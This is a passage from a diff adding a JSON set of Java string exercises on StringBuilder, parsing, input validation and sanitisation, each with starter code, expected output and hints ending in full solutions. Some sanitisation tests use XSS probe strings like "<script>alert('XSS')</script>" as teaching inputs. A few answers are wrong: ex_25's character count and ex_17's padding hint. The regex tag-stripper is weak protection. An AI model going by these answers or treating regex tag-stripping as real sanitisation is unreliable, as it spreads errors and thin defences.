+              "message": "String info=String.format(\"%s (%d) - GPA: %.2f\",name,age,gpa);\nSystem.out.println(info);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_16",
+          "title": "Exercise 16: Build HTML with StringBuilder",
+          "description": "Create an HTML list from an array.",
+          "difficulty": "intermediate",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 5,
+          "ai_intro": "Real web apps build HTML strings all the time.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] items = {\"Laptop\", \"Mouse\", \"Keyboard\"};\n        // TODO: Build HTML unordered list using StringBuilder\n        // <ul>\\n  <li>Laptop</li>\\n  <li>Mouse</li>\\n  <li>Keyboard</li>\\n</ul>\n    }\n}",
+          "expected_output": "<ul>\n  <li>Laptop</li>\n  <li>Mouse</li>\n  <li>Keyboard</li>\n</ul>",
+          "hints": [
+            {
+              "message": "StringBuilder sb=new StringBuilder(); sb.append(\"<ul>\\n\");"
+            },
+            {
+              "message": "for(String item:items) sb.append(\"  <li>\").append(item).append(\"</li>\\n\");"
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder();\nsb.append(\"<ul>\\n\");\nfor(String item:items) sb.append(\"  <li>\").append(item).append(\"</li>\\n\");\nsb.append(\"</ul>\");\nSystem.out.println(sb);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_17",
+          "title": "Exercise 17: Repeat and Pad",
+          "description": "Create repeated patterns and padded strings.",
+          "difficulty": "beginner",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 3,
+          "ai_intro": "String.repeat() and format for padding.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        // TODO: Print a line of 30 dashes\n        // TODO: Print \"Hello\" centered in 30 chars with = padding\n        // TODO: Print numbers 1-5 right-aligned in 5 chars each\n    }\n}",
+          "expected_output": "------------------------------\n============Hello=============\n    1    2    3    4    5",
+          "hints": [
+            {
+              "message": "\"-\".repeat(30) creates 30 dashes."
+            },
+            {
+              "message": "String.format(\"%15s\", \"Hello\") right-pads. Combine with = for both sides."
+            },
+            {
+              "message": "System.out.println(\"-\".repeat(30));\nString s=\"Hello\";int pad=(30-s.length())/2;\nSystem.out.println(\"=\".repeat(pad)+s+\"=\".repeat(30-pad-s.length()));\nfor(int i=1;i<=5;i++)System.out.printf(\"%5d\",i);System.out.println();"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_18",
+          "title": "Exercise 18: Predict -- StringBuilder",
+          "description": "Trace StringBuilder operations.",
+          "difficulty": "intermediate",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 3,
+          "ai_intro": "StringBuilder modifies in place!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        StringBuilder sb = new StringBuilder(\"ABCDEF\");\n        sb.delete(2, 4);    // ?\n        sb.insert(2, \"XY\"); // ?\n        sb.append(\"G\");     // ?\n        sb.replace(0, 2, \"ZZ\"); // ?\n        System.out.println(sb);\n    }\n}\n// TODO: Predict the output",
+          "expected_output": "ZZXYEFG",
+          "hints": [
+            {
+              "message": "delete(2,4) removes index 2-3: ABCDEF -> ABEF"
+            },
+            {
+              "message": "insert(2,\"XY\"): ABEF -> ABXYEF. append(\"G\"): ABXYEFG."
+            },
+            {
+              "message": "replace(0,2,\"ZZ\"): ABXYEFG -> ZZXYEFG"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_19",
+          "title": "Exercise 19: CSV Builder",
+          "description": "Build a CSV string from arrays.",
+          "difficulty": "intermediate",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 5,
+          "ai_intro": "Join parallel arrays into CSV rows.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] names = {\"Alice\",\"Bob\",\"Charlie\"};\n        int[] ages = {25, 30, 22};\n        String[] cities = {\"London\",\"Paris\",\"Tokyo\"};\n        // TODO: Build CSV with header using StringBuilder\n    }\n}",
+          "expected_output": "name,age,city\nAlice,25,London\nBob,30,Paris\nCharlie,22,Tokyo",
+          "hints": [
+            {
+              "message": "StringBuilder sb=new StringBuilder(\"name,age,city\\n\");"
+            },
+            {
+              "message": "for(int i=0;i<names.length;i++) sb.append(names[i]+\",\"+ages[i]+\",\"+cities[i]+\"\\n\");"
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder(\"name,age,city\\n\");\nfor(int i=0;i<names.length;i++)\n  sb.append(names[i]).append(\",\").append(ages[i]).append(\",\").append(cities[i]).append(\"\\n\");\nSystem.out.print(sb);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_20",
+          "title": "Exercise 20: Performance Comparison",
+          "description": "Measure String + vs StringBuilder in a loop.",
+          "difficulty": "intermediate",
+          "category": "StringBuilder & Formatting",
+          "estimated_minutes": 5,
+          "ai_intro": "StringBuilder is dramatically faster for loops.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        int N = 10000;\n        // Method 1: String +\n        long start1 = System.currentTimeMillis();\n        String s = \"\";\n        for (int i = 0; i < N; i++) s += \"a\";\n        long time1 = System.currentTimeMillis() - start1;\n\n        // TODO: Method 2: StringBuilder\n        long start2 = System.currentTimeMillis();\n        // ... your code ...\n        long time2 = System.currentTimeMillis() - start2;\n\n        System.out.println(\"String +: \" + time1 + \"ms\");\n        System.out.println(\"StringBuilder: \" + time2 + \"ms\");\n        System.out.println(\"StringBuilder is \" + (time1 > 0 ? time1/Math.max(time2,1) : \"many\") + \"x faster\");\n    }\n}",
+          "expected_output": "String +: ~50-200ms\nStringBuilder: ~0-1ms\nStringBuilder is many x faster",
+          "hints": [
+            {
+              "message": "StringBuilder sb=new StringBuilder(); for(int i=0;i<N;i++) sb.append(\"a\");"
+            },
+            {
+              "message": "String result = sb.toString(); -- converts at the end."
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder();\nfor(int i=0;i<N;i++) sb.append(\"a\");\nString result2=sb.toString();"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_21",
+          "title": "Exercise 21: Basic Split",
+          "description": "Split a sentence into words.",
+          "difficulty": "beginner",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 3,
+          "ai_intro": "split(\" \") breaks at every space.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String sentence = \"Java is a powerful programming language\";\n        // TODO: Split into words and print each with its index\n    }\n}",
+          "expected_output": "0: Java\n1: is\n2: a\n3: powerful\n4: programming\n5: language",
+          "hints": [
+            {
+              "message": "String[] words = sentence.split(\" \");"
+            },
+            {
+              "message": "for(int i=0;i<words.length;i++) System.out.println(i+\": \"+words[i]);"
+            },
+            {
+              "message": "String[] words=sentence.split(\" \");\nfor(int i=0;i<words.length;i++) System.out.println(i+\": \"+words[i]);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_22",
+          "title": "Exercise 22: Parse CSV Row",
+          "description": "Extract fields from a CSV line.",
+          "difficulty": "beginner",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 4,
+          "ai_intro": "split(\",\") separates comma-delimited values.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String csv = \"John Smith,28,john@email.com,London,Engineer\";\n        // TODO: Split and print each field with label\n    }\n}",
+          "expected_output": "Name: John Smith\nAge: 28\nEmail: john@email.com\nCity: London\nJob: Engineer",
+          "hints": [
+            {
+              "message": "String[] fields = csv.split(\",\");"
+            },
+            {
+              "message": "fields[0] is name, fields[1] is age, etc."
+            },
+            {
+              "message": "String[] f=csv.split(\",\");\nSystem.out.println(\"Name: \"+f[0]);\nSystem.out.println(\"Age: \"+f[1]);\nSystem.out.println(\"Email: \"+f[2]);\nSystem.out.println(\"City: \"+f[3]);\nSystem.out.println(\"Job: \"+f[4]);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_23",
+          "title": "Exercise 23: Join Array into String",
+          "description": "Combine array elements with delimiter.",
+          "difficulty": "beginner",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 3,
+          "ai_intro": "String.join does the reverse of split.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] colours = {\"Red\", \"Green\", \"Blue\", \"Yellow\"};\n        // TODO: Join with \", \" and print\n        // TODO: Join with \" | \" and print\n        // TODO: Join with \" -> \" and print\n    }\n}",
+          "expected_output": "Red, Green, Blue, Yellow\nRed | Green | Blue | Yellow\nRed -> Green -> Blue -> Yellow",
+          "hints": [
+            {
+              "message": "String.join(\", \", colours)"
+            },
+            {
+              "message": "String.join(\" | \", colours)"
+            },
+            {
+              "message": "System.out.println(String.join(\", \",colours));\nSystem.out.println(String.join(\" | \",colours));\nSystem.out.println(String.join(\" -> \",colours));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_24",
+          "title": "Exercise 24: Parse Key-Value Pairs",
+          "description": "Split config string into key=value pairs.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 5,
+          "ai_intro": "Split twice: first by delimiter, then by =.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String config = \"host=localhost;port=8080;debug=true;timeout=30\";\n        // TODO: Parse into key-value pairs and print each\n    }\n}",
+          "expected_output": "host = localhost\nport = 8080\ndebug = true\ntimeout = 30",
+          "hints": [
+            {
+              "message": "First split by \";\" to get pairs."
+            },
+            {
+              "message": "Then split each pair by \"=\" to get key and value."
+            },
+            {
+              "message": "String[] pairs=config.split(\";\");\nfor(String p:pairs){String[] kv=p.split(\"=\");System.out.println(kv[0]+\" = \"+kv[1]);}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_25",
+          "title": "Exercise 25: Count Words and Sentences",
+          "description": "Analyse text statistics.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 4,
+          "ai_intro": "split with regex for flexible delimiters.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String text = \"Java is great. Programming is fun. Strings are powerful.\";\n        // TODO: Count words, sentences, and characters (no spaces)\n    }\n}",
+          "expected_output": "Words: 9\nSentences: 3\nCharacters (no spaces): 46",
+          "hints": [
+            {
+              "message": "Words: text.split(\"\\\\s+\").length"
+            },
+            {
+              "message": "Sentences: text.split(\"\\\\.\").length or count '.' characters."
+            },
+            {
+              "message": "String[] words=text.split(\"\\\\s+\");\nint sentences=text.split(\"\\\\.\").length;\nint chars=text.replace(\" \",\"\").replace(\".\",\"\").length();\nSystem.out.println(\"Words: \"+words.length);\nSystem.out.println(\"Sentences: \"+sentences);\nSystem.out.println(\"Characters (no spaces): \"+chars);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_26",
+          "title": "Exercise 26: URL Parser",
+          "description": "Extract protocol, host, and path from a URL.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 5,
+          "ai_intro": "Combine indexOf and substring for complex parsing.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String url = \"https://www.example.com/products/laptop?id=42\";\n        // TODO: Extract protocol, host, path, query\n    }\n}",
+          "expected_output": "Protocol: https\nHost: www.example.com\nPath: /products/laptop\nQuery: id=42",
+          "hints": [
+            {
+              "message": "Protocol: url.substring(0, url.indexOf(\"://\"))"
+            },
+            {
+              "message": "Split after :// then find the first / for host vs path boundary."
+            },
+            {
+              "message": "int pEnd=url.indexOf(\"://\");\nString protocol=url.substring(0,pEnd);\nString rest=url.substring(pEnd+3);\nint pathStart=rest.indexOf(\"/\");\nString host=rest.substring(0,pathStart);\nString pathQuery=rest.substring(pathStart);\nint qMark=pathQuery.indexOf(\"?\");\nString path=qMark>=0?pathQuery.substring(0,qMark):pathQuery;\nString query=qMark>=0?pathQuery.substring(qMark+1):\"\";\nSystem.out.println(\"Protocol: \"+protocol);\nSystem.out.println(\"Host: \"+host);\nSystem.out.println(\"Path: \"+path);\nSystem.out.println(\"Query: \"+query);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_27",
+          "title": "Exercise 27: Reverse Words",
+          "description": "Reverse the order of words in a sentence.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 4,
+          "ai_intro": "Split, reverse array, join back.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String sentence = \"Hello World from Java\";\n        // TODO: Reverse word order: \"Java from World Hello\"\n    }\n}",
+          "expected_output": "Java from World Hello",
+          "hints": [
+            {
+              "message": "String[] words = sentence.split(\" \");"
+            },
+            {
+              "message": "Loop backwards: for(int i=words.length-1; i>=0; i--)"
+            },
+            {
+              "message": "String[] w=sentence.split(\" \");\nStringBuilder sb=new StringBuilder();\nfor(int i=w.length-1;i>=0;i--){if(i<w.length-1)sb.append(\" \");sb.append(w[i]);}\nSystem.out.println(sb);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_28",
+          "title": "Exercise 28: Parse Log Entry",
+          "description": "Extract timestamp, level, and message from log.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 5,
+          "ai_intro": "Use split with limit to handle messages containing the delimiter.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String log = \"2024-01-15 14:30:22 [ERROR] Connection failed: timeout after 30s\";\n        // TODO: Extract date, time, level, message\n    }\n}",
+          "expected_output": "Date: 2024-01-15\nTime: 14:30:22\nLevel: ERROR\nMessage: Connection failed: timeout after 30s",
+          "hints": [
+            {
+              "message": "Split by space for first parts. Level is between [ and ]."
+            },
+            {
+              "message": "int lStart=log.indexOf(\"[\")+1; int lEnd=log.indexOf(\"]\"); String level=log.substring(lStart,lEnd);"
+            },
+            {
+              "message": "String[] parts=log.split(\" \",4);\nSystem.out.println(\"Date: \"+parts[0]);\nSystem.out.println(\"Time: \"+parts[1]);\nString level=parts[2].replace(\"[\",\"\").replace(\"]\",\"\");\nSystem.out.println(\"Level: \"+level);\nSystem.out.println(\"Message: \"+parts[3]);"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_29",
+          "title": "Exercise 29: Title Case Converter",
+          "description": "Convert 'hello world' to 'Hello World'.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 5,
+          "ai_intro": "Capitalise first letter of each word.",
+          "starter_code": "public class Main {\n    static String toTitleCase(String input) {\n        // TODO: Convert each word to title case\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(toTitleCase(\"hello world from java\"));\n        System.out.println(toTitleCase(\"ALREADY UPPER\"));\n    }\n}",
+          "expected_output": "Hello World From Java\nAlready Upper",
+          "hints": [
+            {
+              "message": "Split into words. For each: first char uppercase + rest lowercase."
+            },
+            {
+              "message": "word.substring(0,1).toUpperCase() + word.substring(1).toLowerCase()"
+            },
+            {
+              "message": "static String toTitleCase(String input){\nString[] words=input.split(\" \");\nStringBuilder sb=new StringBuilder();\nfor(String w:words){if(sb.length()>0)sb.append(\" \");sb.append(w.substring(0,1).toUpperCase()).append(w.substring(1).toLowerCase());}\nreturn sb.toString();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_30",
+          "title": "Exercise 30: Multi-Line Parser",
+          "description": "Parse a structured multi-line text block.",
+          "difficulty": "intermediate",
+          "category": "Split, Join & Parsing",
+          "estimated_minutes": 6,
+          "ai_intro": "Split by newline, then process each line.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String data = \"Name: Alice\\nAge: 25\\nCity: London\\nJob: Engineer\\nSalary: 55000\";\n        // TODO: Parse each line and extract values\n        // TODO: Print as formatted card\n    }\n}",
+          "expected_output": "=== PROFILE CARD ===\nName:   Alice\nAge:    25\nCity:   London\nJob:    Engineer\nSalary: 55000",
+          "hints": [
+            {
+              "message": "String[] lines = data.split(\"\\\\n\");"
+            },
+            {
+              "message": "For each line: split by \": \" to get key and value."
+            },
+            {
+              "message": "System.out.println(\"=== PROFILE CARD ===\");\nfor(String line:data.split(\"\\\\n\")){\nString[] kv=line.split(\": \");\nSystem.out.printf(\"%-8s%s%n\",kv[0]+\":\",kv[1]);}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_31",
+          "title": "Exercise 31: Null and Empty Check",
+          "description": "Write a safe isEmpty check that handles null.",
+          "difficulty": "beginner",
+          "category": "Input Validation",
+          "estimated_minutes": 3,
+          "ai_intro": "Null check FIRST, then empty check.",
+          "starter_code": "public class Main {\n    static boolean isSafe(String input) {\n        // TODO: Return false if null, empty, or only whitespace\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isSafe(\"Hello\"));  // true\n        System.out.println(isSafe(\"\"));       // false\n        System.out.println(isSafe(null));     // false\n        System.out.println(isSafe(\"   \"));   // false\n    }\n}",
+          "expected_output": "true\nfalse\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "Check null FIRST: if(input == null) return false;"
+            },
+            {
+              "message": "Then: if(input.trim().isEmpty()) return false;"
+            },
+            {
+              "message": "static boolean isSafe(String input){return input!=null && !input.trim().isEmpty();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_32",
+          "title": "Exercise 32: Length Validation",
+          "description": "Check if input is within min/max length.",
+          "difficulty": "beginner",
+          "category": "Input Validation",
+          "estimated_minutes": 3,
+          "ai_intro": "Too short or too long = rejected.",
+          "starter_code": "public class Main {\n    static boolean isValidLength(String input, int min, int max) {\n        // TODO: Return true if length is between min and max (inclusive)\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isValidLength(\"abc\", 3, 10));    // true\n        System.out.println(isValidLength(\"ab\", 3, 10));     // false\n        System.out.println(isValidLength(\"12345678901\", 3, 10)); // false\n    }\n}",
+          "expected_output": "true\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "if(input==null) return false;"
+            },
+            {
+              "message": "return input.length() >= min && input.length() <= max;"
+            },
+            {
+              "message": "static boolean isValidLength(String input,int min,int max){return input!=null && input.length()>=min && input.length()<=max;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_33",
+          "title": "Exercise 33: Username Validator",
+          "description": "Only letters, numbers, and underscore allowed.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 5,
+          "ai_intro": "Use matches() with regex for character validation.",
+          "starter_code": "public class Main {\n    static boolean isValidUsername(String u) {\n        // TODO: 3-20 chars, only [a-zA-Z0-9_], not null/empty\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isValidUsername(\"alice_99\"));     // true\n        System.out.println(isValidUsername(\"ab\"));           // false (too short)\n        System.out.println(isValidUsername(\"user<script>\")); // false (special chars)\n        System.out.println(isValidUsername(null));           // false\n        System.out.println(isValidUsername(\"a_very_long_username_here_123\")); // false (too long)\n    }\n}",
+          "expected_output": "true\nfalse\nfalse\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "Check null, then length, then pattern."
+            },
+            {
+              "message": "return input.matches(\"[a-zA-Z0-9_]+\") after length check."
+            },
+            {
+              "message": "static boolean isValidUsername(String u){if(u==null)return false;if(u.length()<3||u.length()>20)return false;return u.matches(\"[a-zA-Z0-9_]+\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_34",
+          "title": "Exercise 34: Email Validator",
+          "description": "Basic email format validation.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 5,
+          "ai_intro": "Must have @, domain, and extension.",
+          "starter_code": "public class Main {\n    static boolean isValidEmail(String e) {\n        // TODO: Not null, contains @, has text before and after @, has . in domain\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isValidEmail(\"alice@company.com\")); // true\n        System.out.println(isValidEmail(\"test@x.uk\"));        // true\n        System.out.println(isValidEmail(\"invalid\"));           // false\n        System.out.println(isValidEmail(\"@domain.com\"));       // false\n        System.out.println(isValidEmail(\"user@\"));             // false\n    }\n}",
+          "expected_output": "true\ntrue\nfalse\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "if(!e.contains(\"@\")) return false; String[] parts=e.split(\"@\");"
+            },
+            {
+              "message": "if(parts.length!=2 || parts[0].isEmpty() || parts[1].isEmpty()) return false;"
+            },
+            {
+              "message": "static boolean isValidEmail(String e){if(e==null||!e.contains(\"@\"))return false;String[] p=e.split(\"@\");if(p.length!=2||p[0].isEmpty())return false;return p[1].contains(\".\")&&p[1].length()>3;}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_35",
+          "title": "Exercise 35: Password Strength Checker",
+          "description": "Check for uppercase, lowercase, digit, special char.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 6,
+          "ai_intro": "Loop through each character and check its category.",
+          "starter_code": "public class Main {\n    static String checkStrength(String pw) {\n        // TODO: Return WEAK / MEDIUM / STRONG based on criteria\n        // STRONG: 8+ chars, has upper+lower+digit+special\n        // MEDIUM: 6+ chars, has 3 of the 4 categories\n        // WEAK: everything else\n        return \"WEAK\";\n    }\n    public static void main(String[] args) {\n        System.out.println(checkStrength(\"Str0ng!Pass\"));  // STRONG\n        System.out.println(checkStrength(\"Hello123\"));     // MEDIUM\n        System.out.println(checkStrength(\"abc\"));          // WEAK\n    }\n}",
+          "expected_output": "STRONG\nMEDIUM\nWEAK",
+          "hints": [
+            {
+              "message": "Count categories: boolean hasUpper, hasLower, hasDigit, hasSpecial."
+            },
+            {
+              "message": "for(char c:pw.toCharArray()) check Character.isUpperCase etc."
+            },
+            {
+              "message": "static String checkStrength(String pw){if(pw==null||pw.length()<4)return\"WEAK\";boolean u=false,l=false,d=false,s=false;for(char c:pw.toCharArray()){if(Character.isUpperCase(c))u=true;if(Character.isLowerCase(c))l=true;if(Character.isDigit(c))d=true;if(!Character.isLetterOrDigit(c))s=true;}int cats=(u?1:0)+(l?1:0)+(d?1:0)+(s?1:0);if(pw.length()>=8&&cats==4)return\"STRONG\";if(pw.length()>=6&&cats>=3)return\"MEDIUM\";return\"WEAK\";}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_36",
+          "title": "Exercise 36: Validate Integer Input",
+          "description": "Check if a string is a valid integer before parsing.",
+          "difficulty": "beginner",
+          "category": "Input Validation",
+          "estimated_minutes": 4,
+          "ai_intro": "parseInt throws NumberFormatException on bad input.",
+          "starter_code": "public class Main {\n    static boolean isInteger(String s) {\n        // TODO: Return true if s can be parsed as integer\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isInteger(\"123\"));    // true\n        System.out.println(isInteger(\"-42\"));    // true\n        System.out.println(isInteger(\"12.5\"));   // false\n        System.out.println(isInteger(\"abc\"));    // false\n        System.out.println(isInteger(\"\"));       // false\n        System.out.println(isInteger(null));     // false\n    }\n}",
+          "expected_output": "true\ntrue\nfalse\nfalse\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "Try-catch: try{Integer.parseInt(s);return true;}catch(Exception e){return false;}"
+            },
+            {
+              "message": "Or use regex: s.matches(\"-?\\\\d+\")"
+            },
+            {
+              "message": "static boolean isInteger(String s){if(s==null||s.isEmpty())return false;try{Integer.parseInt(s);return true;}catch(NumberFormatException e){return false;}}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_37",
+          "title": "Exercise 37: Phone Number Validator",
+          "description": "Accept multiple UK phone formats.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 5,
+          "ai_intro": "Normalise first, then validate.",
+          "starter_code": "public class Main {\n    static boolean isValidUKPhone(String phone) {\n        // TODO: Accept: 07700123456, 07700-123456, 07700 123456, +447700123456\n        return false;\n    }\n    public static void main(String[] args) {\n        System.out.println(isValidUKPhone(\"07700123456\"));    // true\n        System.out.println(isValidUKPhone(\"07700-123456\"));   // true\n        System.out.println(isValidUKPhone(\"+447700123456\"));  // true\n        System.out.println(isValidUKPhone(\"123\"));            // false\n        System.out.println(isValidUKPhone(\"abcdefghijk\"));    // false\n    }\n}",
+          "expected_output": "true\ntrue\ntrue\nfalse\nfalse",
+          "hints": [
+            {
+              "message": "First normalise: remove spaces, dashes, and replace +44 with 0."
+            },
+            {
+              "message": "String clean = phone.replaceAll(\"[\\\\s-]\",\"\").replace(\"+44\",\"0\");"
+            },
+            {
+              "message": "static boolean isValidUKPhone(String p){if(p==null)return false;String c=p.replaceAll(\"[\\\\s-]\",\"\").replace(\"+44\",\"0\");return c.matches(\"0\\\\d{10}\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_38",
+          "title": "Exercise 38: Whitelist Characters",
+          "description": "Allow only specific characters in input.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 4,
+          "ai_intro": "Whitelist is safer than blacklist.",
+          "starter_code": "public class Main {\n    static String whitelistOnly(String input, String allowed) {\n        // TODO: Remove all chars NOT in allowed string\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(whitelistOnly(\"Hello123!@#\", \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"));\n        System.out.println(whitelistOnly(\"admin<script>\", \"abcdefghijklmnopqrstuvwxyz\"));\n    }\n}",
+          "expected_output": "Hello123\nadminscript",
+          "hints": [
+            {
+              "message": "Loop each character. If allowed.contains(String.valueOf(c)), keep it."
+            },
+            {
+              "message": "StringBuilder sb=new StringBuilder(); for(char c:input.toCharArray()) if(allowed.indexOf(c)>=0) sb.append(c);"
+            },
+            {
+              "message": "static String whitelistOnly(String input,String allowed){StringBuilder sb=new StringBuilder();for(char c:input.toCharArray())if(allowed.indexOf(c)>=0)sb.append(c);return sb.toString();}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_39",
+          "title": "Exercise 39: Regex Pattern Matching",
+          "description": "Use matches() for multiple validation patterns.",
+          "difficulty": "intermediate",
+          "category": "Input Validation",
+          "estimated_minutes": 5,
+          "ai_intro": "Regex is the most powerful validation tool.",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        String[] tests = {\"AB12 3CD\", \"12345\", \"abc\", \"SW1A 1AA\", \"INVALID!\"};\n        String postcodePattern = \"[A-Z]{1,2}[0-9][0-9A-Z]?\\\\s?[0-9][A-Z]{2}\";\n        for (String t : tests) {\n            // TODO: Check each against postcode pattern\n        }\n    }\n}",
+          "expected_output": "AB12 3CD -> VALID\n12345 -> INVALID\nabc -> INVALID\nSW1A 1AA -> VALID\nINVALID! -> INVALID",
+          "hints": [
+            {
+              "message": "t.matches(postcodePattern) returns true/false."
+            },
+            {
+              "message": "System.out.println(t + \" -> \" + (t.matches(postcodePattern) ? \"VALID\" : \"INVALID\"));"
+            },
+            {
+              "message": "for(String t:tests)System.out.println(t+\" -> \"+(t.matches(postcodePattern)?\"VALID\":\"INVALID\"));"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_40",
+          "title": "Exercise 40: Complete Form Validator",
+          "description": "Validate name, email, age, and phone together.",
+          "difficulty": "advanced",
+          "category": "Input Validation",
+          "estimated_minutes": 7,
+          "ai_intro": "Real forms validate ALL fields before accepting.",
+          "starter_code": "public class Main {\n    static boolean validName(String n) { return n!=null&&n.trim().length()>=2&&n.matches(\"[a-zA-Z ]+\"); }\n    static boolean validAge(String a) { try{int v=Integer.parseInt(a);return v>=0&&v<=120;}catch(Exception e){return false;} }\n    // TODO: Add validEmail and validPhone methods\n    static void validateForm(String name, String email, String age, String phone) {\n        // TODO: Validate all fields, print results\n    }\n    public static void main(String[] args) {\n        validateForm(\"Alice Smith\", \"alice@co.com\", \"25\", \"07700123456\");\n        validateForm(\"\", \"invalid\", \"abc\", \"123\");\n    }\n}",
+          "expected_output": "=== Form 1 ===\nName: VALID\nEmail: VALID\nAge: VALID\nPhone: VALID\nResult: ACCEPTED\n=== Form 2 ===\nName: INVALID\nEmail: INVALID\nAge: INVALID\nPhone: INVALID\nResult: REJECTED",
+          "hints": [
+            {
+              "message": "validEmail: contains @, has domain with dot."
+            },
+            {
+              "message": "validPhone: normalise then check 11 digits starting with 0."
+            },
+            {
+              "message": "static boolean validEmail(String e){if(e==null||!e.contains(\"@\"))return false;String[]p=e.split(\"@\");return p.length==2&&!p[0].isEmpty()&&p[1].contains(\".\");}\nstatic boolean validPhone(String p){if(p==null)return false;return p.replaceAll(\"[\\\\s-]\",\"\").matches(\"0\\\\d{10}\");}\nstatic void validateForm(String n,String e,String a,String p){boolean vn=validName(n),ve=validEmail(e),va=validAge(a),vp=validPhone(p);System.out.println(\"Name: \"+(vn?\"VALID\":\"INVALID\"));System.out.println(\"Email: \"+(ve?\"VALID\":\"INVALID\"));System.out.println(\"Age: \"+(va?\"VALID\":\"INVALID\"));System.out.println(\"Phone: \"+(vp?\"VALID\":\"INVALID\"));System.out.println(\"Result: \"+(vn&&ve&&va&&vp?\"ACCEPTED\":\"REJECTED\"));}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_41",
+          "title": "Exercise 41: Strip HTML Tags",
+          "description": "Remove all HTML tags from input.",
+          "difficulty": "beginner",
+          "category": "Sanitisation & Security",
+          "estimated_minutes": 4,
+          "ai_intro": "replaceAll with regex removes HTML.",
+          "starter_code": "public class Main {\n    static String stripTags(String input) {\n        // TODO: Remove all HTML tags\n        return \"\";\n    }\n    public static void main(String[] args) {\n        System.out.println(stripTags(\"<b>Hello</b> <i>World</i>\"));\n        System.out.println(stripTags(\"<script>alert('XSS')</script>\"));\n        System.out.println(stripTags(\"No tags here\"));\n    }\n}",
+          "expected_output": "Hello World\nalert('XSS')\nNo tags here",
+          "hints": [
+            {
+              "message": "replaceAll(\"<[^>]*>\", \"\") removes anything between < and >."
+            },
+            {
+              "message": "static String stripTags(String input){return input.replaceAll(\"<[^>]*>\",\"\");}"
+            },
+            {
+              "message": "static String stripTags(String input){if(input==null)return\"\";return input.replaceAll(\"<[^>]*>\",\"\");}"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_42",
+          "title": "Exercise 42: Escape HTML Entities",
